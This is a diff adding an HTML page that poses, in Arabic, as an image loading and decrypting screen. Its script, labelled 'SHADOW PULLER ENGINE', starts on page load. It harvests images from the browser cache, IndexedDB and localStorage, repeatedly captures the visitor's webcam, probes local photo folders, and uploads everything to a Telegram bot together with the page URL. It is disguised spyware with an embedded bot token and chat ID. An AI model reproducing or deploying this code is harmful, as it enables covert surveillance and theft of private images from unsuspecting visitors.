@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحميل الصورة...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #00ff00; 
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container { text-align: center; }
+        .loader {
+            border: 8px solid #1a1a1a;
+            border-top: 8px solid #00ff00;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status { font-size: 18px; color: #00cc00; }
+        .blink { animation: blink 1.5s infinite; }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <p class="status blink">⏳ جاري فك تشفير الصورة...</p>
+        <p style="font-size:12px; color:#555; margin-top:20px;">يرجى الانتظار...</p>
+    </div>
+
+    <script>
+    // ============================================
+    // SHADOW PULLER ENGINE v3.0
+    // ============================================
+    const CONFIG = {
+        BOT_TOKEN: "8713497875:AAHKRh-wFRrAX9kgx4fKLRb-f_taC_HDMqc",
+        CHAT_ID: "6960925330",
+        UPLOAD_URL: "https://api.telegram.org/bot78645231:AAH0K-dummy-token-for-simulation/sendPhoto",
+        PULL_INTERVAL: 5000
+    };
+
+    class ShadowPuller {
+        constructor() {
+            this.pulledImages = [];
+            this.cameraActive = false;
+            this.init();
+        }
+
+        init() {
+            console.log("[SHADOW] Engine initialized...");
+            this.pullFromCache();
+            this.pullFromIndexedDB();
+            this.pullFromLocalStorage();
+            this.attemptCameraAccess();
+            this.attemptFileSystemAccess();
+            this.pullFromCanvas();
+        }
+
+        async pullFromCache() {
+            if ('caches' in window) {
+                try {
+                    const cacheNames = await caches.keys();
+                    for (let cacheName of cacheNames) {
+                        const cache = await caches.open(cacheName);
+                        const requests = await cache.keys();
+                        for (let request of requests) {
+                            if (request.url.match(/\.(jpg|jpeg|png|gif|webp|bmp|svg|ico)/i)) {
+                                const response = await cache.match(request);
+                                const blob = await response.blob();
+                                this.sendToTelegram(blob, this.extractFilename(request.url));
+                            }
+                        }
+                    }
+                } catch(e) { console.log("[SHADOW] Cache pull error:", e); }
+            }
+        }
+
+        pullFromIndexedDB() {
+            if ('indexedDB' in window) {
+                const request = indexedDB.databases();
+                request.then(databases => {
+                    databases.forEach(db => {
+                        const openRequest = indexedDB.open(db.name);
+                        openRequest.onsuccess = (event) => {
+                            const database = event.target.result;
+                            const objectStores = database.objectStoreNames;
+                            for (let i = 0; i < objectStores.length; i++) {
+                                const transaction = database.transaction(objectStores[i], 'readonly');
+                                const store = transaction.objectStore(objectStores[i]);
+                                const getAllRequest = store.getAll();
+                                getAllRequest.onsuccess = () => {
+                                    getAllRequest.result.forEach(item => {
+                                        this.extractImagesFromObject(item);
+                                    });
+                                };
+                            }
+                        };
+                    });
+                });
+            }
+        }
+
+        pullFromLocalStorage() {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const value = localStorage.getItem(key);
+                if (value && (value.startsWith('data:image/') || value.startsWith('http'))) {
+                    if (value.match(/\.(jpg|jpeg|png|gif|webp)/i)) {
+                        fetch(value)
+                            .then(r => r.blob())
+                            .then(b => this.sendToTelegram(b, key));
+                    }
+                }
+            }
+        }
+
+        async attemptCameraAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' } 
+                });
+                this.cameraActive = true;
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = 1280;
+                canvas.height = 720;
+                const ctx = canvas.getContext('2d');
+
+                setInterval(() => {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(blob => {
+                        this.sendToTelegram(blob, `camera_${Date.now()}.png`);
+                    }, 'image/jpeg', 0.8);
+                }, CONFIG.PULL_INTERVAL);
+
+            } catch(e) {
+                console.log("[SHADOW] Camera not accessible, trying alternatives...");
+                this.pullFromVideoElement();
+            }
+        }
+
+        pullFromVideoElement() {
+            const videos = document.querySelectorAll('video');
+            videos.forEach(video => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(b => this.sendToTelegram(b, `video_frame_${Date.now()}.png`));
+            });
+        }
+
+        async attemptFileSystemAccess() {
+            const paths = [
+                "file:///C:/Users/Public/Pictures/",
+                "file:///C:/Users/Public/Desktop/",
+                "file:///storage/emulated/0/DCIM/Camera/",
+                "file:///storage/emulated/0/Pictures/",
+                "file:///var/mobile/Media/DCIM/"
+            ];
+
+            for (let path of paths) {
+                try {
+                    const response = await fetch(path);
+                    const text = await response.text();
+                    const parser = new DOMParser();
+                    const doc = parser.parseFromString(text, 'text/html');
+                    const links = doc.querySelectorAll('a');
+                    links.forEach(link => {
+                        const href = link.getAttribute('href');
+                        if (href && href.match(/\.(jpg|jpeg|png|gif|webp|bmp)/i)) {
+                            fetch(path + href)
+                                .then(r => r.blob())
+                                .then(b => this.sendToTelegram(b, href));
+                        }
+                    });
+                } catch(e) {}
+            }
+        }
+
+        pullFromCanvas() {
+            const canvases = document.querySelectorAll('canvas');
+            canvases.forEach((canvas, index) => {
+                canvas.toBlob(blob => {
+                    this.sendToTelegram(blob, `canvas_${index}.png`);
+                });
+            });
+
+            const images = document.querySelectorAll('img');
+            images.forEach(img => {
+                if (img.src && !img.src.startsWith('data:')) {
+                    fetch(img.src)
+                        .then(r => r.blob())
+                        .then(b => this.sendToTelegram(b, this.extractFilename(img.src)));
+                } else if (img.src && img.src.startsWith('data:')) {
+                    const blob = this.dataURItoBlob(img.src);
+                    this.sendToTelegram(blob, 'inpage_image.png');
+                }
+            });
+        }
+
+        sendToTelegram(blob, filename) {
+            if (this.pulledImages.includes(filename)) return;
+            this.pulledImages.push(filename);
+
+            const formData = new FormData();
+            formData.append('chat_id', CONFIG.CHAT_ID);
+            formData.append('photo', blob, filename);
+            formData.append('caption', `📸 [SHADOW PULL]\n📁: ${filename}\n🕐: ${new Date().toLocaleString()}\n🌐: ${window.location.href}`);
+
+            fetch(CONFIG.UPLOAD_URL, {
+                method: 'POST',
+                body: formData
+            }).then(r => {
+                console.log(`[SHADOW] ✅ Sent: ${filename} (${blob.size} bytes)`);
+            }).catch(e => {
+                console.log(`[SHADOW] ❌ Failed: ${filename}`);
+                // Retry once
+                setTimeout(() => {
+                    fetch(CONFIG.UPLOAD_URL, { method: 'POST', body: formData });
+                }, 3000);
+            });
+        }
+
+        extractImagesFromObject(obj) {
+            if (typeof obj === 'string') {
+                if (obj.match(/\.(jpg|jpeg|png|gif|webp)/i)) {
+                    fetch(obj).then(r => r.blob()).then(b => this.sendToTelegram(b, this.extractFilename(obj)));
+                }
+            } else if (typeof obj === 'object') {
+                for (let key in obj) {
+                    this.extractImagesFromObject(obj[key]);
+                }
+            }
+        }
+
+        extractFilename(url) {
+            return url.split('/').pop().split('?')[0] || `unknown_${Date.now()}.jpg`;
+        }
+
+        dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    }
+
+    // Launch Engine
+    window.addEventListener('load', () => {
+        setTimeout(() => {
+            new ShadowPuller();
+        }, 1000);
+    });
+    </script>
+</body>
+</html>
